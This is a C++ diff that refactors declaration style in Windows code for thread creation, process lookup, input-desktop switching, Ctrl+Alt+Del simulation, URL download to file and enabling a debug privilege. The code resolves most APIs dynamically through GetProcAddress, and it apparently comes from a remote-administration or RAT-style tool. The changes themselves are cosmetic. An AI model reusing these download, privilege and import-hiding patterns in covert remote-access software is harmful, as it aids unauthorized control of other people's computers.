@@ -15,15 +15,13 @@ inline unsigned long WINAPI _beginthreadex_EX(void* security,
 	unsigned initflag,
 	unsigned* thrdaddr)
 {
-	HANDLE NewThread;
-
 	/*
 	 * Just call the API function. Any CRT specific processing is done in
 	 * DllMain DLL_THREAD_ATTACH
 	 */
-	NewThread = CreateThread((LPSECURITY_ATTRIBUTES)security, stack_size,
-		(LPTHREAD_START_ROUTINE)start_address,
-		arglist, initflag, (PULONG)thrdaddr);
+	HANDLE NewThread = CreateThread((LPSECURITY_ATTRIBUTES)security, stack_size,
+	                                (LPTHREAD_START_ROUTINE)start_address,
+	                                arglist, initflag, (PULONG)thrdaddr);
 
 	return (unsigned long)NewThread;
 }
@@ -54,13 +52,12 @@ HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
 	DWORD dwCreationFlags,                    // creation option
 	LPDWORD lpThreadId, bool bInteractive)
 {
-	HANDLE	hThread = INVALID_HANDLE_VALUE;
 	THREAD_ARGLIST	arg;
 	arg.start_address = (unsigned(__stdcall *)(void *))lpStartAddress;
 	arg.arglist = (void *)lpParameter;
 	arg.bInteractive = bInteractive;
 	arg.hEventTransferArg = CreateEvent(NULL, false, false, NULL);
-	hThread = (HANDLE)_beginthreadex_EX((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);
+	HANDLE hThread = (HANDLE)_beginthreadex_EX((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);
 	WaitForSingleObject(arg.hEventTransferArg, INFINITE);
 	CloseHandle(arg.hEventTransferArg);
 
@@ -81,9 +78,8 @@ DWORD GetProcessID(LPCTSTR lpProcessName)
 		}
 
 		typedef BOOL(WINAPI *PROC32)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
-		PROC32  myProc32;
 		HINSTANCE hdllv = GetModuleHandleW(L"Kernel32.dll");
-		myProc32 = (PROC32)GetProcAddress(hdllv, "Process32Next");
+		PROC32 myProc32 = (PROC32)GetProcAddress(hdllv, "Process32Next");
 
 		while (myProc32(handle, &info) != FALSE)
 		{
@@ -103,7 +99,6 @@ bool SwitchInputDesktop()
 	bool	bRet = false;
 	DWORD	dwLengthNeeded;
 
-	HDESK	hOldDesktop, hNewDesktop;
 	TCHAR	strCurrentDesktop[256], strInputDesktop[256];
 
 	HINSTANCE user32 = LoadLibraryW(L"user32.dll");
@@ -111,11 +106,11 @@ bool SwitchInputDesktop()
 	typedef BOOL(WINAPI *STDP)(HDESK);
 	STDP mySetThreadDesktop = (STDP)GetProcAddress(user32, "SetThreadDesktop");
 
-	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
+	HDESK hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
 	memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));
 	GetUserObjectInformation(hOldDesktop, UOI_NAME, &strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded);
 
-	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
+	HDESK hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
 	memset(strInputDesktop, 0, sizeof(strInputDesktop));
 	GetUserObjectInformation(hNewDesktop, UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);
 
@@ -239,8 +234,6 @@ BOOL SimulateCtrlAltDel()
 
 bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
 {
-	HINTERNET	hInternet = NULL, hUrl = NULL;
-	HANDLE		hFile;
 	TCHAR		buffer[1024];
 	DWORD		dwBytesRead = 0;
 	DWORD		dwBytesWritten = 0;
@@ -256,12 +249,12 @@ bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
 	NETOPEN myNetOpen = (NETOPEN)GetProcAddress(hdllde, "InternetOpenA");
 #endif
 
-	hInternet = myNetOpen(_T("MSIE 6.0"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);
+	HINTERNET hInternet = myNetOpen(_T("MSIE 6.0"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);
 
 	if (hInternet == NULL)
 		return false;
 
-	typedef HINTERNET(WINAPI *NETOPENURL)(HINTERNET hInternet, LPCTSTR lpszUrl, LPCTSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);
+	typedef HINTERNET(WINAPI *NETOPENURL)(HINTERNET lphInternet, LPCTSTR lpszUrl, LPCTSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);
 
 #ifdef UNICODE
 	NETOPENURL myNetOpenUrl = (NETOPENURL)GetProcAddress(hdllde, "InternetOpenUrlW");
@@ -269,16 +262,15 @@ bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
 	NETOPENURL myNetOpenUrl = (NETOPENURL)GetProcAddress(hdllde, "InternetOpenUrlA");
 #endif
 
-	hUrl = myNetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+	HINTERNET hUrl = myNetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
 
 	if (hUrl == NULL)
 		return false;
 
-	hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
+	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
 
-	typedef BOOL(WINAPI *APIS)(HINTERNET hUrl, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
-	APIS myapis;
-	myapis = (APIS)GetProcAddress(hdllde, "InternetReadFile");
+	typedef BOOL(WINAPI *APIS)(HINTERNET lphUrl, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
+	APIS myapis = (APIS)GetProcAddress(hdllde, "InternetReadFile");
 
 	if (hFile != INVALID_HANDLE_VALUE)
 	{
@@ -293,7 +285,7 @@ bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
 		CloseHandle(hFile);
 	}
 
-	typedef BOOL(WINAPI *NETCLOSE)(HINTERNET hInternet);
+	typedef BOOL(WINAPI *NETCLOSE)(HINTERNET lphInternet);
 	NETCLOSE  myNetClose = (NETCLOSE)GetProcAddress(hdllde, "InternetCloseHandle");
 
 	myNetClose(hUrl);
@@ -304,7 +296,7 @@ bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
 
 bool DebugPrivilege(const TCHAR *PName, BOOL bEnable)
 {
-	bool              bResult = TRUE;
+	bool              bResult = true;
 
 	HANDLE            hToken;
 	TOKEN_PRIVILEGES  TokenPrivileges;
@@ -312,12 +304,11 @@ bool DebugPrivilege(const TCHAR *PName, BOOL bEnable)
 	HINSTANCE advapi32 = LoadLibraryW(L"ADVAPI32.dll");
 
 	typedef BOOL(WINAPI *OPT)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
-	OPT myopt;
-	myopt = (OPT)GetProcAddress(advapi32, "OpenProcessToken");
+	OPT myopt = (OPT)GetProcAddress(advapi32, "OpenProcessToken");
 
 	if (!myopt(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
 	{
-		bResult = FALSE;
+		bResult = false;
 		return bResult;
 	}
 	TokenPrivileges.PrivilegeCount = 1;
@@ -340,7 +331,7 @@ bool DebugPrivilege(const TCHAR *PName, BOOL bEnable)
 
 	if (GetLastError() != ERROR_SUCCESS)
 	{
-		bResult = FALSE;
+		bResult = false;
 	}
 
 	CloseHandle(hToken);
